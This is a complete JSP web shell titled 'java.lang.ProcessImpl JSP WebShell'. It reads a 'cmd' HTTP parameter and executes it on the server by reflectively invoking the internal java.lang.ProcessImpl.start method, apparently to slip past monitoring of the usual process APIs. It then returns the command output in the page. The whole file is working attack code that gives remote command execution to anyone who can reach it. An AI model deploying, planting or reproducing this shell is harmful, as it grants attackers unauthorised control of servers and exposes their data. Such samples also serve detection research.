<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.util.Map" %>
<%@ page import="sun.reflect.misc.MethodUtil" %>
<html>
<body>
<h2>java.lang.ProcessImpl JSP WebShell</h2>
<%
    try {
        final String s = request.getParameter("cmd");
        Class clz = Class.forName("java.lang.ProcessImpl");
        Method method = clz.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
        method.setAccessible(true);
        Process process = (Process) MethodUtil.invoke(method, clz, new Object[]{s.split(" "), null, null, null, false});
        InputStream inputStream = process.getInputStream();
        StringBuilder stringBuilder = new StringBuilder();
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
        String line;
        while ((line = bufferedReader.readLine()) != null) {
            stringBuilder.append(line).append("\n");
        }
        if (stringBuilder.length() > 0) {
            response.getOutputStream().write(stringBuilder.toString().getBytes());
        }
    } catch (Exception e) {
        e.printStackTrace();
    }

%>
</body>
</html>